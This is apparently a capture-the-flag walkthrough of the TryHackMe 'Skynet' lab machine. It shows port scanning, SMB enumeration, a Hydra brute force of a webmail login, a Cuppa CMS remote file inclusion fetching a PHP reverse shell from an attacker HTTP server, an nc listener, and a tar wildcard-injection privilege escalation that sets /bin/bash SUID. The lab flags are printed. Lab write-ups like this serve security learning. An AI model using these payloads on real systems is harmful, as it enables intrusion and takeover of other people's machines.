
IP - 10.48.179.102

## Recon

### Rustscan

```Bash
rustscan -a 10.48.179.102 -- -sC -sV -oN services.txt
# Services Scans
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack ttl 62 Dovecot pop3d
|_pop3-capabilities: TOP UIDL RESP-CODES CAPA PIPELINING SASL AUTH-RESP-CODE
139/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 62 Dovecot imapd
|_imap-capabilities: LITERAL+ LOGINDISABLEDA0001 more have OK SASL-IR IDLE LOGIN-REFERRALS post-login ID listed capabilities ENABLE IMAP4rev1 Pre-login
445/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Total open ports
Open 10.48.179.102:22
Open 10.48.179.102:80
Open 10.48.179.102:110
Open 10.48.179.102:139
Open 10.48.179.102:143
Open 10.48.179.102:445
```
### SMB Enumeration

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ smbclient //10.48.179.102/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831516 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)


$cat attention.txt                                                                          
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
               
```

Found Logs directory - only interesting things are log1.txt
```Bash
 cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

Looks like these are some passwords lets try to brute force the the already known user - Miles Dyson.
### Hydra Password Cracking

```Bash
hydra -l milesdyson -P log1.txt 10.48.179.102 http-post-form "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -V 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-20 08:12:23
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.48.179.102:80/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.48.179.102 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.48.179.102   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-20 08:12:43

```

Using the above obtained password to login to /squirrelmail

Found a mail with SMB password reset for miles dyson

Now lets access SMB account of milesdyson to enumerate further!!

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ smbclient //10.48.179.102/milesdyson/ -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5798772 blocks available
smb: \> cd notes
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019

```

Lets check Important.txt!!
```Bash                                  
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

We found a hidden directory!!
Lets enumerate it

### Web Directory enumeration again

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ ffuf -u http://10.48.179.102/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.zip,.txt,.bak -mc 200,301 -o hiddenffuf.txt 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.179.102/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .php .zip .txt .bak 
 :: Output file      : hiddenffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301
________________________________________________

administrator           [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 89ms]

```

/administrator directory shows site is powered by Cuppa!!
Lets quickly search for vulnerabilities
## Service Exploitation

### Download Exploit

```Bash
$ searchsploit cuppa           
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                 | php/webapps/25971.txt

```

```Bash
searchsploit -m php/webapps/25971.txt
cat 25971.txt
```

### Study Exploit
exploit URL - http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```URL
#example exploits 
http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```


### LFI vulnerability to trigger revershell 

```Bash 
#on attack machine
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.179.102 - - [20/Jan/2026 08:30:23] "GET /php-reverse-shell.php HTTP/1.0" 200 

#on attack machine setup listener
┌──(kali㉿kali)-[~/Downloads/thm/skynet]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.159.0] from (UNKNOWN) [10.48.179.102] 44730
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 07:42:26 up 55 min,  0 users,  load average: 0.02, 0.06, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```

## Obtain User.txt

```Bash
$ cd /home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
```
## PrivEsc using backup.sh and Tar

```Bash
$ cd /home
$ ls 
milesdyson
$ cd milesdyson
$ ls -al
total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
$ cd backups
$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

#root is executing tar command in /var/www/html/
$ echo "chmod u+s /bin/bash" > root.sh
$ touch "/var/www/html/--checkpoint=1"
$ touch "/var/www/html/--checkpoint-action=exec=sh root.sh"
```

## Obtain Root.txt
```Bash
$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
$ /bin/bash -p
whoami
root
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
exit
```